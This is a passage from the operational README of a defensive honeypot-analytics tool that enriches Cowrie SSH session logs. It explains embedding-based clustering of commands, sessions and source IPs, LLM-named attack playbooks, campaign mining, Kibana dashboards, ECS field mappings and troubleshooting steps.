sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster commands
```

If any docs fail to re-embed (network blip, embedding model timeout), they are left uncached and fall back to normal LLM re-enrichment on the next `enrich` run.

### Scalar feature augmentation (include behavioral signals in the cluster)

**Problem:** two commands with identical semantics can have wildly different behavioral signals — one seen 10,000× from 300 IPs (commodity), another seen once from a single IP (novel). The 768-dim embedding treats them identically.

**What changed:** the shared clustering core (`clustering.py`) appends a small (n × 4) scalar block to the L2-normalized embedding matrix before running HDBSCAN. The four features — log-normalized `occurrence_count`, log-normalized `unique_source_ips`, `confidence / 10`, and `session_reuse_rate` — let HDBSCAN separate commodity payloads from rare ones even when their text is similar.

Centroid vectors written to the command-clusters index and used by the `novel_embedding` triage rule are still pure 768-dim. Novelty scores are computed against those pure centroids — so triage behaviour is unchanged. Sessions and IPs get their own scalar blocks; see `session.cluster_scalar_weight` and `ip.cluster_scalar_weight` in `config/default.yaml`.

**Config** (`config/default.yaml`, override in `local.yaml`):

```yaml
command_cluster:
  scalar_weight: 0.05   # scalar block contributes ~5% of vector norm; tune 0.0–0.15
```

Set `scalar_weight: 0.0` to disable. No data migration needed — runs on the next `cluster commands` pass.

**Tuning:** monitor `n_outliers` after changing the weight. If it drops sharply, the scalar block is over-separating commodity from novel within what should be one cluster. If it stays broadly stable, the signal is additive.

---

## Phase 4 — Session and IP analysis

Phase 4 lifts analysis from individual commands to behavior: one doc per completed session, one doc per source IP. Both layers are purely additive — nothing touches the enrichment index, the command watermark, or the SQLite cache.

### What Phase 4 builds

**Session layer** (`rollup sessions` + `cluster sessions`)

One doc per completed Cowrie session (identified by a `cowrie.session.closed` event). Each doc aggregates all events for that session from the events index and joins with the command enrichment docs already written by Phase 1:

- Connection metadata: source IP + port, destination IP + port, protocol, geo/ASN.
- Session duration from `event.duration` on the `cowrie.session.closed` event.
- Credential counts: login successes and failures.
- File activity: download and upload counts.
- SSH client fingerprint (`user_agent.original`) and HASSH algorithm string.
- Command statistics from the enrichment index: dominant intent, mean + max novelty score, mean confidence, Shannon entropy of the command distribution (high entropy = varied commands = interactive attacker; low = repetitive = automated scanner).
- **Session embedding** — mean-pool of the stored command embeddings. Sessions with no enriched commands yet write a partial doc and are updated on the next `rollup sessions` run after `enrich` catches up.

`cluster sessions` runs HDBSCAN over session embeddings augmented with four behavioral scalars (command count, unique command count, login success rate, mean novelty) and writes cluster IDs and novelty scores back to each session doc.

**IP layer** (`rollup ips` + `cluster ips`)

One doc per `source.ip`, built by aggregating across all of that IP's session docs:

- Total sessions, sessions with successful logins, sessions with commands.
- Total commands and file downloads across all sessions.
- Mean-pool of session embeddings → one IP-level 768-dim vector.
- Dominant intent, mean/max novelty score, mean session duration.
- First and last seen timestamps.

`cluster ips` clusters the IP embeddings (augmented with session count, login success rate, mean novelty, mean session duration). IP clusters are unnamed "actor profile" buckets — they're not LLM-named. An IP's playbook membership is derived from the sessions it produced; an IP's campaign membership is derived from `mine campaigns` (which writes to its own index, not back onto IP docs).

**Playbook layer** (`name playbooks`)

`name playbooks` prompts the **local** LLM (never cloud) with sample commands from each non-outlier session cluster and writes a 3-5 word `playbook_name` — e.g. "XMRig Mining Dropper", "Mirai Botnet Variant", "Go SSH Credential Spray" — plus a stable `playbook_id` (`sescl-<16hex>`, a SHA-256 prefix over the sorted member-session-id set) to both the cluster centroid doc and every member session doc. The content-addressed form means a re-run with identical playbook membership produces the identical id, so downstream pivots (campaign ids especially, which fingerprint the sorted playbook-id set) don't churn across re-clusterings.

**Campaign layer** (`mine campaigns`)

`mine campaigns` runs two miners that identify multi-session patterns:

- **behaviour** (FP-growth over per-IP playbook bags) — catches kill-chain combinations like "IPs that ran playbook A AND B AND C are doing the same operation."
- **infrastructure** (connected components of sessions sharing URLs / SSH keys / file hashes) — catches operations tied by shared toolchain even when commands differ.

Each campaign is one doc in the `campaigns-dshield.cowrie-default` index, carrying its own member-playbook / member-session / member-IP lists. See [`docs/PLAYBOOKS_AND_CAMPAIGNS.md`](docs/PLAYBOOKS_AND_CAMPAIGNS.md) for the data model and tuning knobs.

---

### Upgrading from a pre-Phase-4 deployment (Phase 3 → full Phase 4)

Phase 4 is purely additive. Nothing in the upgrade touches the enrichment index, the command watermark, the SQLite cache, or the cluster centroids. You add four new ES indices, install no new Python dependencies (the `[cluster]` extra is already required by Phase 3), and schedule four new CLI commands.

**Step 1 — Pull the updated code**

```bash
cd /opt/dshield_prism
sudo -u dshield_prism git pull
```

**Step 2 — Confirm cluster deps are installed**

Phase 4 uses the same `numpy` + `scikit-learn` extras as Phase 3. If Phase 3 is already running, skip this.

```bash
sudo -u dshield_prism .venv/bin/pip install -e ".[cluster]"
```

**Step 3 — Find your index names**

Index names live under `elasticsearch.indexes.cowrie.*` in your config. With the defaults from `config/default.yaml`, the Phase 4 indices are:

| Layer key | Default index name |
|---|---|
| `sessions_rollup` | `rollup-dshield.cowrie.session-default` |
| `session_clusters` | `clusters-dshield.cowrie.session-default` |
| `ips_rollup` | `rollup-dshield.cowrie.source_ip-default` |
| `ip_clusters` | `clusters-dshield.cowrie.source_ip-default` |

If you override any of these in `local.yaml`, print the resolved names:

```bash
sudo -u dshield_prism .venv/bin/python -c "
from enrich.config import load_config
cfg = load_config('config/default.yaml')
ix = cfg.elasticsearch.indexes.cowrie
print('sessions:         ', ix.sessions_rollup)
print('sessions-clusters:', ix.session_clusters)
print('ips:              ', ix.ips_rollup)
print('ips-clusters:     ', ix.ip_clusters)
"
```

**Step 4 — Create the four new indices**

`init-indexes` is idempotent — already-existing layers return `action: "noop"`. You can run it once with no `--layer` to create every missing layer for the source:

```bash
CLI=".venv/bin/python -m enrich.cli"

sudo -u dshield_prism $CLI init-indexes
```

Or scope to a single layer when you want to verify one at a time:

```bash
sudo -u dshield_prism $CLI init-indexes --layer sessions
sudo -u dshield_prism $CLI init-indexes --layer session_clusters
sudo -u dshield_prism $CLI init-indexes --layer ips
sudo -u dshield_prism $CLI init-indexes --layer ip_clusters
```

> **Tip:** `rollup sessions` and `rollup ips` also auto-create their respective rollup indices on first run (same pattern as `cluster commands` auto-creates the command-clusters index). The explicit `init-indexes` steps above let you verify the mapping before data arrives.

**Step 5 — Dry-run to verify event access**

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli rollup sessions --dry-run
```

Expected output:
```json
{ "closed_sessions_found": 1847, "max_ts": "2026-05-09T14:32:10.000Z", "dry_run": true }
```

`closed_sessions_found: 0` means no `cowrie.session.closed` events are visible at your `events_index` pattern. Verify in Kibana Dev Tools:
```
GET <events_index>/_count
{ "query": { "term": { "event.action": "cowrie.session.closed" } } }
```

**Step 6 — Initial session backfill**

With no session watermark, the first run processes every closed session ever recorded. It reads from ES and mgets enrichment docs — no LLM calls.

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli rollup sessions
```

Example output:
```json
{
  "closed_sessions_found": 1847,
  "sessions_built": 1843,
  "sessions_with_embedding": 1801,
  "sessions_no_events": 4,
  "bulk_ok": 1843,
  "sessions_index": "rollup-dshield.cowrie.session-default"
}
```

`sessions_with_embedding < sessions_built` is normal — sessions whose commands haven't been enriched yet write partial docs and are filled in on the next rollup after `enrich` runs. `sessions_no_events` are ghost session IDs from partial ingest.

**Step 7 — Cluster sessions**

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster sessions --dry-run
sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster sessions
```

Every session doc with an embedding now has `dshield.cowrie.enrichment.session.cluster.*` fields.

**Step 8 — Initial IP backfill**

`rollup ips` finds all IPs that had sessions updated since the IP watermark (none yet, so it processes everything).

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli rollup ips --dry-run
sudo -u dshield_prism .venv/bin/python -m enrich.cli rollup ips
```

Example output:
```json
{
  "affected_ips": 312,
  "ips_built": 312,
  "ips_with_embedding": 287,
  "bulk_ok": 312,
  "ips_index": "rollup-dshield.cowrie.source_ip-default"
}
```

**Step 9 — Cluster IPs**

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster ips --dry-run
sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster ips
```

**Step 10 — Name playbooks**

Always uses the **local** LLM — never escalates to cloud regardless of `cloud.enabled`. Naming is a short, low-stakes generation where consistency across runs matters more than per-call quality. Dry-run first to preview which clusters will be named and what commands they'll be shown.

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli name playbooks --dry-run
sudo -u dshield_prism .venv/bin/python -m enrich.cli name playbooks
```

Each cluster logs: `Session cluster cluster_N (42 sessions) → 'XMRig Mining Dropper'`. The name and the stable `playbook_id` are written to the cluster centroid doc and to every member session doc.

Prompt template: `config/prompts/playbook_name.txt`.

**Step 11 — Mine campaigns**

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli mine campaigns --dry-run
sudo -u dshield_prism .venv/bin/python -m enrich.cli mine campaigns --kind all
```

This is purely algorithmic — no LLM involvement. Output goes to the `campaigns-dshield.cowrie-default` index. See [`docs/PLAYBOOKS_AND_CAMPAIGNS.md`](docs/PLAYBOOKS_AND_CAMPAIGNS.md) for tuning knobs.

**Step 12 — Import Kibana dashboards**

Two dashboard NDJSON files ship with the project. Import each one:

Kibana → Stack Management → Saved Objects → Import → select file → confirm.

| File | Dashboard title | Data view created |
|---|---|---|
| `es-dashboards/command-enrichment-dashboard.ndjson` | `[DShield] Command Enrichment` | `enriched-dshield.cowrie.command-default` |
| `es-dashboards/session-analysis.ndjson` | `[DShield] Session Behavior Analysis` | `rollup-dshield.cowrie.session-default` |

If your index names differ from the defaults, edit the imported data views after import: Stack Management → Data Views → find the view → edit the index pattern title to match your actual index name. The console at `/insights` is the recommended way to browse playbooks and campaigns; Kibana coverage is intentionally lighter.

**Step 13 — Add to the recurring schedule**

The two systemd units shipped in `systemd/` already cover the full cadence — no manual edits required if you used `scripts/setup-security-onion-node.sh`. For reference, the chain is:

```
# Hourly (dshield_prism-ingest.service)
enrich
rollup sessions

# 6-hourly (dshield_prism-analytics.service)
cluster commands
escalate                       (skipped if cloud disabled or budget exhausted)
cluster sessions               (requires .[cluster] extras)
name playbooks
rollup ips
cluster ips                    (requires .[cluster] extras)
mine campaigns
```

If you maintain custom unit files instead, add each step as an additional `ExecStart=` line — systemd runs them sequentially inside a oneshot service. Every step except the first `cluster commands` is declared with the `-` prefix so a transient failure (cloud disabled, LLM unreachable, etc.) doesn't fail the whole unit.

```bash
sudo systemctl daemon-reload
```

---

### Phase 4 — operational notes

**Watermarks** — Phase 4 adds two new watermark keys to the existing SQLite file. None are cleared by the `reset` command (which only clears the command watermark).

| Watermark key | Cleared by | To reset manually |
|---|---|---|
| `last_processed_at` | `reset --watermark` | — |
| `session_last_processed_at` | nothing | `DELETE FROM watermark WHERE key = 'session_last_processed_at';` |
| `ip_rollup_last_processed_at` | nothing | `DELETE FROM watermark WHERE key = 'ip_rollup_last_processed_at';` |

Run `sqlite3 /var/lib/dshield_prism/state.sqlite` to open the SQLite shell.

**Re-rollup after enrichment changes** — if you bump `prompt_version` and re-enrich (changing intent, novelty, or confidence in the enrichment docs), session and IP docs become stale. Full refresh:

```bash
# sqlite3 /var/lib/dshield_prism/state.sqlite
DELETE FROM watermark WHERE key IN ('session_last_processed_at', 'ip_rollup_last_processed_at');
```

Then run the full Phase 4 pipeline in order: `rollup sessions` → `cluster sessions` → `name playbooks` → `rollup ips` → `cluster ips` → `mine campaigns`.

**Sessions without embeddings** — sessions are written when their `cowrie.session.closed` event appears, even if none of their commands have been enriched yet. Partial docs (no embedding) are updated automatically on subsequent `rollup sessions` runs. `cluster sessions` silently skips them until the next rollup cycle.

**Most sessions will not have embeddings** — this is expected, not a bug. The majority of Cowrie sessions are pure credential spray: connect, attempt a few logins, disconnect with no commands. These sessions have no commands to embed. They are still valuable for the IP layer (the IP doc tracks total sessions, login success rate, etc.) and will contribute to IP clustering via their IP's other sessions that did run commands.

**Cluster IDs are run-scoped** — for both sessions and IPs, `cluster_0`, `cluster_1`, etc. may shift between runs. Use `scored_at` to know which run produced the current labels. Playbook names (written by `name playbooks`) live on the cluster centroid doc and on every member session doc. `cluster sessions` clears the playbook label from a session when it's re-clustered (since the old name was attached to a different clustering run); the next `name playbooks` pass repopulates it. By default `name playbooks` skips clusters that already have a `playbook_name` — pass `--force` to re-name everything.

**Re-naming playbooks** — to update names after the LLM prompt changes:

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli name playbooks --force
```

This regenerates names for all clusters and updates both centroid docs and member session docs.

**Playbook naming uses the local LLM only** — `name playbooks` calls the local LLM directly via `generate_json(prompt, ...)` and never escalates to cloud, regardless of `cloud.enabled`. Reason: the output is 3-5 words and naming consistency across runs matters more than per-call quality. Prompt template: `config/prompts/playbook_name.txt`. `mine campaigns` is purely algorithmic — no LLM involvement.

**`ip_embed_version`** — recorded on every IP doc. Informational only; `rollup ips` always overwrites the full IP doc regardless.

---

### Kibana dashboards

Two ready-to-import NDJSON dashboard files ship with the project. For playbook / campaign exploration, the recommended UI is the standalone investigation console (`/insights` page); Kibana coverage is intentionally light.

**`[DShield] Session Behavior Analysis`** (`es-dashboards/session-analysis.ndjson`)

Panels: total sessions · sessions with commands · behavioral outliers (cluster.is_outlier) · successful intrusions (login OK + commands) · sessions over time area chart · dominant intent donut · most novel sessions data table (sorted by max novelty desc) · top attacker IPs table.

**Primary workflow:** check the **Behavioral outliers** metric first. Click it to filter the dashboard to outlier sessions only. In the **Most novel sessions** table, look for rows where `Max Novelty > 0.7`, `Login OK >= 1`, and `Downloads >= 1` in the same session — those are the highest-value sessions to investigate. Copy a session ID, go to Discover, filter `cowrie.session_id: "<id>"` on the enrichment index to read every command in that session with MITRE labels and IOC extraction attached.

**`[DShield] Command Enrichment`** (`es-dashboards/command-enrichment-dashboard.ndjson`)

Panels covering per-command intent / MITRE / confidence / novelty distribution. The main Phase 1-3 view.

**Useful KQL filters for Discover:**

```
# Sessions index — interactive sessions worth reading
dshield.cowrie.enrichment.session.login_success_count >= 1
  and dshield.cowrie.enrichment.session.command_count >= 1

# Sessions index — high command entropy (human explorer, not script)
dshield.cowrie.enrichment.session.command_entropy >= 2.5

# Sessions index — file exfiltration attempts
dshield.cowrie.enrichment.session.file_download_count >= 1

# Sessions index — novel sessions not assigned to any cluster
dshield.cowrie.enrichment.session.cluster.is_outlier : true

# Sessions index — sessions belonging to a named playbook
dshield.cowrie.enrichment.session.playbook_name : "Curl Pipe Bash Dropper"

# IP index — outlier IPs (lone wolves or new actor profiles)
dshield.cowrie.enrichment.ip.cluster.is_outlier : true

# IP index — IPs that successfully logged in
dshield.cowrie.enrichment.ip.successful_sessions >= 1

# Pivot: all commands from a specific session (enrichment index)
cowrie.session_id : "<session_id_here>"
```

### Pivoting on a playbook name

You found an interesting `playbook_name` in the console or in Discover. Walk the chain to find the commands and events behind it.

```
Step 1 — Sessions index: get the playbook's sessions
  dshield.cowrie.enrichment.session.playbook_name : "Your Playbook Name"
  → sort by dshield.cowrie.enrichment.session.max_novelty_score desc
  → focus on rows with login_success_count >= 1
  → note cowrie.session_id values

Step 2 — Enrichment index: read the commands (deduplicated, with MITRE labels)
  cowrie.session_id : "abc12345"

Step 3 — Events index: read the raw event timeline
  cowrie.session_id : "abc12345"
  → ordered: connect → logins → commands → file downloads → disconnect
```

The investigation console at `/insights` provides the same chain interactively, plus an IP→playbook view, a 14-day sparkline per playbook, and a separate panel for multi-session campaigns.

---

## ECS field reference

The doc shape is ECS-compliant: standard fields under `event.*`, `process.*`, `observer.*`, `threat.*`. Custom enrichment fields live under `dshield.cowrie.enrichment.*` — matching the `dshield.<source>.*` namespace convention used by the SO ingest pipelines in `elastic_pipeline/` (e.g. `dshield.signature.*` from `webhoneypot-pipeline.yml`, `event.dataset: dshield.cowrie.session` from `cowrie-pipeline.yml`). Future log sources would extend the same pattern: `dshield.webhoneypot.enrichment.*`, `dshield.<source>.enrichment.*`, etc.

| Path | Type | Notes |
|---|---|---|
| `@timestamp` | date | Enrichment time |
| `event.kind` | keyword | `"enrichment"` |
| `event.category` / `event.type` | keyword[] | `["process"]` / `["info"]` |
| `event.module` / `event.dataset` | keyword | `"cowrie"` / `"dshield.cowrie.enrichment.command"` |
| `event.provider` | keyword | `"local"`, `"local_failed"`, or `"claude"` (Phase 2 cloud-rewritten doc) |
| `event.start` / `event.end` | date | First / last seen across grouped events |
| `event.id` | keyword | 16-char sha256 prefix; same as ES `_id` |
| `event.reason` | text | LLM-generated description (length scales with command complexity) |
| `event.ingested` | date | Same as `@timestamp` for enrichment docs |
| `process.command_line` | text + .keyword | Normalized command, identical to source events |
| `process.hash.sha256` | keyword | Full sha256 of normalized command |
| `observer.type` / `observer.vendor` | keyword | `"honeypot"` / `"Cowrie"` |
| `threat.framework` | keyword | `"MITRE ATT&CK"` |
| `threat.tactic.id` | keyword[] | e.g. `["TA0002"]` |
| `threat.technique.id` | keyword[] | e.g. `["T1059.004", "T1105"]` |
| `threat.indicator` | nested[] | `{type, ip, domain, url.full, file.name, file.hash.sha256}` |
| `dshield.cowrie.enrichment.intent` | keyword | Custom enum (no ECS equivalent) |
| `dshield.cowrie.enrichment.confidence` | byte | Integer 1-10, LLM self-rated; see prompt for anchors |
| `dshield.cowrie.enrichment.model` | keyword | LLM model identifier |
| `dshield.cowrie.enrichment.prompt_version` | keyword | Bump to invalidate cache |
| `dshield.cowrie.enrichment.occurrence_count` | long | Total events for this command |
| `dshield.cowrie.enrichment.unique_sessions` | long | Distinct cowrie session IDs |
| `dshield.cowrie.enrichment.unique_source_ips` | long | Distinct attacker IPs |
| `dshield.cowrie.enrichment.command_truncated` | boolean | True if command was >4000 chars |
| `dshield.cowrie.enrichment.embedding` | dense_vector(768) | For kNN / clustering |
| `dshield.cowrie.enrichment.triage_reasons` | keyword[] | Phase 2: rule codes that fired for this doc (`low_confidence<=N`, `local_failed`, `base64_blob`, `ip_literal`, `rare_tld`, `novel_embedding`, `sample`, `budget_exhausted`, `cloud_parse_failed`) |
| `dshield.cowrie.enrichment.notes` | text | Phase 2: free-text analyst notes from the cloud model (actor/family/campaign hypotheses) |
| `dshield.cowrie.enrichment.local_fallback.*` | object | Phase 2: snapshot of the local model's output, retained when the doc is rewritten by cloud |
| `dshield.cowrie.enrichment.cluster.id` | keyword | Phase 3: HDBSCAN cluster label (`cluster_N`) or `"outlier"` — run-scoped, not stable across re-runs |
| `dshield.cowrie.enrichment.cluster.novelty_score` | float | Phase 3: `1 - max_cosine_sim` to any cluster centroid. Range 0–1; outliers always `1.0`. Use for long-tail queries |
| `dshield.cowrie.enrichment.cluster.is_outlier` | boolean | Phase 3: true when HDBSCAN assigned label `-1` (no cluster fit) |
| `dshield.cowrie.enrichment.cluster.scored_at` | date | Phase 3: timestamp of the cluster run that set these fields |

### Session rollup index fields (Phase 4)

One doc per completed Cowrie session. Doc `_id` = `cowrie.session_id`. Written by `rollup sessions`; cluster fields written by `cluster sessions`.

| Path | Type | Notes |
|---|---|---|
| `@timestamp` | date | Session close time (or connect time if no close event found) |
| `event.kind` | keyword | `"enrichment"` |
| `event.category` | keyword[] | `["network"]` |
| `event.dataset` | keyword | `"dshield.cowrie.enrichment.session"` |
| `event.start` | date | `cowrie.session.connect` timestamp |
| `event.end` | date | `cowrie.session.closed` timestamp |
| `event.duration` | long | Session duration in nanoseconds (from `cowrie.session.closed`) |
| `source.ip` / `source.port` | ip / integer | Attacker IP and source port |
| `source.geo.*` | object | Geographic data (already enriched by ingest pipeline) |
| `source.as.number` / `source.as.organization.name` | long / keyword | ASN info |
| `destination.ip` / `destination.port` | ip / integer | Honeypot target address |
| `network.protocol` / `network.type` | keyword | `"ssh"` or `"telnet"` / `"ipv4"` or `"ipv6"` |
| `user.name` | keyword | Login username from `cowrie.login.*` events |
| `user_agent.original` | keyword | SSH client version string (`cowrie.client.version`) |
| `cowrie.session_id` | keyword | Cowrie session ID — matches `cowrie.session_id` in the events index |
| `cowrie.password` | keyword | Login password attempted |
| `cowrie.hassh_algorithms` | keyword | SSH algorithm negotiation string (HASSH) |
| `dshield.cowrie.enrichment.session.command_count` | long | Total command.input events in the session (with repetition) |
| `dshield.cowrie.enrichment.session.unique_commands` | long | Distinct command hashes |
| `dshield.cowrie.enrichment.session.login_success_count` | long | Count of `cowrie.login.success` events |
| `dshield.cowrie.enrichment.session.login_fail_count` | long | Count of `cowrie.login.failed` events |
| `dshield.cowrie.enrichment.session.file_download_count` | long | Count of `cowrie.session.file_download` events |
| `dshield.cowrie.enrichment.session.file_upload_count` | long | Count of `cowrie.session.file_upload` events |
| `dshield.cowrie.enrichment.session.dominant_intent` | keyword | Most frequent intent across the session's enriched commands |
| `dshield.cowrie.enrichment.session.mean_novelty_score` | float | Mean of `cluster.novelty_score` across unique enriched commands |
| `dshield.cowrie.enrichment.session.max_novelty_score` | float | Max novelty score — one highly novel command raises this even in a routine session |
| `dshield.cowrie.enrichment.session.mean_confidence` | float | Mean LLM confidence across enriched commands |
| `dshield.cowrie.enrichment.session.command_entropy` | float | Shannon entropy (bits) of the command frequency distribution. High = varied commands (interactive attacker); low = repetitive (automated scanner) |
| `dshield.cowrie.enrichment.session.session_embed_version` | keyword | Version tag; bump `session.session_embed_version` in config when embeddings are rebuilt |
| `dshield.cowrie.enrichment.session.embedding` | dense_vector(768) | Mean-pool of the session's command embeddings. Absent if no commands have been enriched yet |
| `dshield.cowrie.enrichment.session.cluster.id` | keyword | `cluster_N` or `"outlier"` — run-scoped, not stable across re-runs |
| `dshield.cowrie.enrichment.session.cluster.novelty_score` | float | Session-level novelty: `1 - max_cosine_sim` to nearest session cluster centroid |
| `dshield.cowrie.enrichment.session.cluster.is_outlier` | boolean | True when HDBSCAN assigned label `-1` |
| `dshield.cowrie.enrichment.session.cluster.scored_at` | date | Timestamp of the `cluster sessions` run that wrote these fields |
| `dshield.cowrie.enrichment.session.playbook_id` | keyword | Stable playbook primary key (`sescl-<16hex>`, SHA-256 prefix over the sorted member-session-id set); written by `name playbooks`. Content-addressed: identical playbook membership across runs yields the identical id |
| `dshield.cowrie.enrichment.session.playbook_name` | keyword | LLM-generated playbook label (written by `name playbooks`). Same value is on the cluster centroid doc in the session-clusters index |

### IP rollup index fields (Phase 4b)

One doc per `source.ip`. Doc `_id` = source IP address. Written by `rollup ips`; cluster fields written by `cluster ips`. IP rollups don't carry a playbook or campaign field — both are derived from the IP's sessions at query time.

| Path | Type | Notes |
|---|---|---|
| `@timestamp` | date | Time the IP doc was last built |
| `source.ip` | ip | Attacker IP — also the document `_id` |
| `source.geo.*` | object | Geographic data from the first available session |
| `source.as.number` / `source.as.organization.name` | long / keyword | ASN info |
| `dshield.cowrie.enrichment.ip.total_sessions` | long | Total closed sessions seen from this IP |
| `dshield.cowrie.enrichment.ip.successful_sessions` | long | Sessions with at least one `cowrie.login.success` |
| `dshield.cowrie.enrichment.ip.command_sessions` | long | Sessions with at least one `cowrie.command.input` |
| `dshield.cowrie.enrichment.ip.total_commands` | long | Sum of `session.command_count` across all sessions |
| `dshield.cowrie.enrichment.ip.file_download_count` | long | Sum of file downloads across all sessions |
| `dshield.cowrie.enrichment.ip.dominant_intent` | keyword | Most frequent intent across all sessions |
| `dshield.cowrie.enrichment.ip.mean_novelty_score` | float | Mean of session `mean_novelty_score` |
| `dshield.cowrie.enrichment.ip.max_novelty_score` | float | Max novelty score across all sessions |
| `dshield.cowrie.enrichment.ip.mean_session_duration_s` | float | Mean session duration in seconds |
| `dshield.cowrie.enrichment.ip.first_seen` | date | Earliest session start across all sessions |
| `dshield.cowrie.enrichment.ip.last_seen` | date | Most recent session end |
| `dshield.cowrie.enrichment.ip.ip_embed_version` | keyword | Version tag for the IP embedding |
| `dshield.cowrie.enrichment.ip.embedding` | dense_vector(768) | Mean-pool of session embeddings. Absent if no sessions had embeddings |
| `dshield.cowrie.enrichment.ip.cluster.id` | keyword | `cluster_N` or `"outlier"` — run-scoped |
| `dshield.cowrie.enrichment.ip.cluster.novelty_score` | float | `1 - max_cosine_sim` to nearest IP cluster centroid |
| `dshield.cowrie.enrichment.ip.cluster.is_outlier` | boolean | True when HDBSCAN assigned label `-1` |
| `dshield.cowrie.enrichment.ip.cluster.scored_at` | date | Timestamp of the `cluster ips` run that wrote these fields |

### Pivoting across indices

All four indices are connected by shared keys:

| From | To | Shared field |
|---|---|---|
| Events index | Command enrichment | `process.command_line.keyword` or `_id` = sha256[:16] of normalized command |
| Events index | Sessions index | `cowrie.session_id` |
| Sessions index | Command enrichment | `cowrie.session_id` (events index is the bridge) |
| Sessions index | IP index | `source.ip` |
| IP index | Sessions index | `source.ip` |

Note: Kibana's `_score` field is the ES query relevance score — not a severity indicator. Use `dshield.cowrie.enrichment.confidence` for confidence filtering and `dshield.cowrie.enrichment.cluster.novelty_score` (command), `dshield.cowrie.enrichment.session.cluster.novelty_score` (session), or `dshield.cowrie.enrichment.ip.cluster.novelty_score` (IP) for novelty filtering at each respective level.

---

## Operational notes

- **Cache key** = `(short_command_hash, generation_model, prompt_version, embed_version)`. Bump `worker.prompt_version` after prompt edits (forces LLM re-enrichment + re-embedding). Bump `llm.embed_version` after changing `llm.embed_context`, then run `reembed` to update vectors without re-running the LLM.
- **Watermarks** — there are three, all in SQLite (`/var/lib/dshield_prism/state.sqlite`):
  - `last_processed_at` — command watermark, advanced by `enrich`. Cleared by `reset --watermark`.
  - `session_last_processed_at` — session watermark, advanced by `rollup sessions`. **Not** cleared by `reset`. To reset: `DELETE FROM watermark WHERE key = 'session_last_processed_at';` via `sqlite3`.
  - `ip_rollup_last_processed_at` — IP watermark, advanced by `rollup ips`. **Not** cleared by `reset`. To reset: `DELETE FROM watermark WHERE key = 'ip_rollup_last_processed_at';` via `sqlite3`.
- **Failure handling**: failed enrichments (`event.provider: "local_failed"`) are written to ES with empty fields but are **not cached**, so they will be retried whenever the same command appears again.
- **Long commands** are truncated to 4000 chars before hashing; `dshield.cowrie.enrichment.command_truncated: true` is set on the doc.
- **GPU OOM**: the worker calls one generation + one embedding sequentially. If you stack other workloads on the same GPU, expect failures. Cap generation context with the `options` dict in `llm/ollama.py` or `llm/openai_compat.py` if needed.
- **Phase 3/4 cluster deps** (`numpy`, `scikit-learn`) are an optional extra — `pip install -e ".[cluster]"`. Both ship as pre-built wheels; no Cython or compiler needed. The base package (`pip install -e .`) does not pull them in, so Phase 1/2 work on any SO box without the heavy ML deps.
- **Re-enrich / re-scan from scratch**:
  ```bash
  sudo -u dshield_prism .venv/bin/python -m enrich.cli reset --yes
  ```
- **Index management**: SO 2.x manages its own indices but does NOT touch the enrichment or sessions indices. Add an ILM policy if you want rollover/retention; not required for Phase 1-4 volumes (likely <1GB/year combined).
- **Provider switch**: changing `llm.provider` mid-stream is fine — but bump `prompt_version` so cached results from the old provider get re-run if you want consistency.

## Troubleshooting

| Symptom | Likely cause |
|---|---|
| `[FAIL] elasticsearch: AuthenticationException` | Wrong creds in `.env`, or user lacks index permissions |
| `[FAIL] llm: ConnectError` / timeout | Firewall on GPU box, server not bound on `0.0.0.0`, wrong port |
| `[FAIL] model missing on server` | Pull/load the model on the LLM server (Ollama: `ollama pull <name>`; LM Studio: load it in the UI) |
| `[FAIL] embedding dim X != 768` | Embed model is not 768-dim. Pick `nomic-embed-text` (768) or change `dense_vector.dims` in `es-mappings/...json` and recreate the index |
| `sessions_raw ... has 0 docs` | Wrong index pattern; find it via Kibana Dev Tools `GET _cat/indices/*cowrie*?v&s=index` |
| `enriched_failed` high | LLM returning malformed JSON. Check raw output in journal logs; tune the prompt or move to a stronger model |
| `chat 400: 'response_format.type' must be 'json_schema' or 'text'` | LM Studio rejects `json_object`. Already handled by passing the Pydantic schema as `json_schema` — make sure you are on the latest code |
| `dense_vector` mapping conflict on first write | Index was auto-created by a write before `init-indexes` ran. Delete the index and re-run `init-indexes --layer commands` (or whichever layer is affected) |
| Worker hangs on first run | Generation slow on cold model. Check `journalctl -fu dshield_prism-ingest.service`; service has `TimeoutStartSec=2h` |
| `rollup sessions` → `closed_sessions_found: 0` | No `cowrie.session.closed` events in the events index, or wrong index pattern. Verify: `GET <events_index>/_count {"query":{"term":{"event.action":"cowrie.session.closed"}}}` |
| `sessions_with_embedding` much lower than `sessions_built` | Most sessions are pure credential spray with no commands — this is expected. For sessions that did have commands, run `enrich` first, then re-run `rollup sessions`. Session docs overwrite idempotently. |
| `cluster sessions` → `skipped_too_few` | Fewer session docs with embeddings than `session.cluster_min_cluster_size` (default 3). Either run more `rollup sessions` passes after `enrich`, or lower `cluster_min_cluster_size` in `local.yaml`. |
| Sessions index not found when running `cluster sessions` | Run `rollup sessions` first (it auto-creates the index), or create it manually with `init-indexes --layer sessions`. |
| `rollup ips` → `affected_ips: 0` | No session docs updated since the IP watermark. Run `rollup sessions` first, then `rollup ips`. Or reset the IP watermark: `DELETE FROM watermark WHERE key = 'ip_rollup_last_processed_at';`. |
| `cluster ips` → `skipped_too_few` | Fewer IP docs with embeddings than `ip.cluster_min_cluster_size` (default 3). IPs only get an embedding when at least one of their sessions had commands. Lower the threshold or run more `enrich` + `rollup sessions` + `rollup ips` passes. |
| `name playbooks` → `[ERROR] prompts.playbook_name is unset` | The `playbook_name` prompt path is missing from config. Check `config/default.yaml` has `prompts.playbook_name: "config/prompts/playbook_name.txt"` and the file exists. |
| `name playbooks` → all clusters `skipped_no_commands` | The events index has no `cowrie.command.input` events for the sample sessions, or the events index pattern doesn't match. Verify `elasticsearch.indexes.cowrie.sessions_raw` in config and check the events index contains `event.action: cowrie.command.input` docs. |
